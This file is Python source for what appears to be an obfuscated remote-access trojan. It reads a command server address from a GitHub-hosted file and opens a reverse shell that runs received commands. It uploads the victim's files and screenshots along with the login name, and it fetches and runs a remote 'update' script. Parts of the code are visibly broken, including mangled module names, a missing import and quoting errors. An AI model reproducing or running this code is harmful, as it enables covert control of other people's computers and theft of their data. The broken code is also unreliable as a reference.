import sys,subyEcukDNC,socket,time,requests
from PIL import ImageGrab
PSIDWayJjohavIEcKzTvgm = "1.29.11.24"
xtpHBKxhxt = ""
oaQiSeeSygVxHWvm = ""
tToaDlkDdxqvmSB = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
IcijAmWGtZCEV = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
TeuAnRXRlbPJRHgVmp = "!"
def qqDRPVWjrHiaurP(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.qqDRPVWjrHiaurP((host, port))
	return s
def yEcukDNC(s):
	QlIsnYUrOmshAInYJ = s.recv(1024)
	if len(QlIsnYUrOmshAInYJ)==0:
		return True
	else:
		GeorAIhFLuubMCdwikAM(s, QlIsnYUrOmshAInYJ.decode("utf-8"))
def GeorAIhFLuubMCdwikAM(s, YTnCMfrawnGlsyIX):
	if not YTnCMfrawnGlsyIX.startswith(TeuAnRXRlbPJRHgVmp):
		proc = subyEcukDNC.run(QlIsnYUrOmshAInYJ.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	kHBXXehwSvTvGilOC = YTnCMfrawnGlsyIX.split(" ")[0][1:]
	if kHBXXehwSvTvGilOC == "download":
		ebZiUpQszqWAUdiVUbu(s, YTnCMfrawnGlsyIX)
	elif kHBXXehwSvTvGilOC == "screenshot":
		IOXxezseFmaQgJDBT(s)
def ebZiUpQszqWAUdiVUbu(s, YTnCMfrawnGlsyIX):
	ZIFIMcgRDbGoS = YTnCMfrawnGlsyIX.replace(TeuAnRXRlbPJRHgVmp+"screenshot ", "").split(",")
	results = []
	for f in ZIFIMcgRDbGoS:
		results += HbYEJCJEBpmukoSIqYS(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def IOXxezseFmaQgJDBT(YTnCMfrawnGlsyIX):
	npuOuuwQGIKGEalkqN = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	npuOuuwQGIKGEalkqN.save(fpath)
	npuOuuwQGIKGEalkqN.close()
	r = HbYEJCJEBpmukoSIqYS(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def HbYEJCJEBpmukoSIqYS(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(xtpHBKxhxt+":"+oaQiSeeSygVxHWvm+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"
def gGkoAJnmdzXQCsTM():
	if xtpHBKxhxt == "" or oaQiSeeSygVxHWvm == "":
		QlIsnYUrOmshAInYJ = requests.get(tToaDlkDdxqvmSB).text.replace("\n","").split(":")
		xtpHBKxhxt = QlIsnYUrOmshAInYJ[0].strip()
		oaQiSeeSygVxHWvm = QlIsnYUrOmshAInYJ[1].strip()
		SJfsyNf = QlIsnYUrOmshAInYJ[2].strip()
	return xtpHBKxhxt, oaQiSeeSygVxHWvm, SJfsyNf
def AaarndvJMXCquEYYIn():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+PSIDWayJjohavIEcKzTvgm + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(IcijAmWGtZCEV+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")
def wcACZAEYauIeObfA():
	pass
def dKSUddXVLENQLUPQFpzygym():
	h, p, v = gGkoAJnmdzXQCsTM()
	if PSIDWayJjohavIEcKzTvgm != v:
		AaarndvJMXCquEYYIn()
	wcACZAEYauIeObfA()
	while True:
		try:
			while True:
				vKHapeMSQYcqxTI=False
				try:
					s=qqDRPVWjrHiaurP(h, p)
					while not vKHapeMSQYcqxTI:
						s.send(b"\n>> ")
						vKHapeMSQYcqxTI=yEcukDNC(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(dKSUddXVLENQLUPQFpzygym())
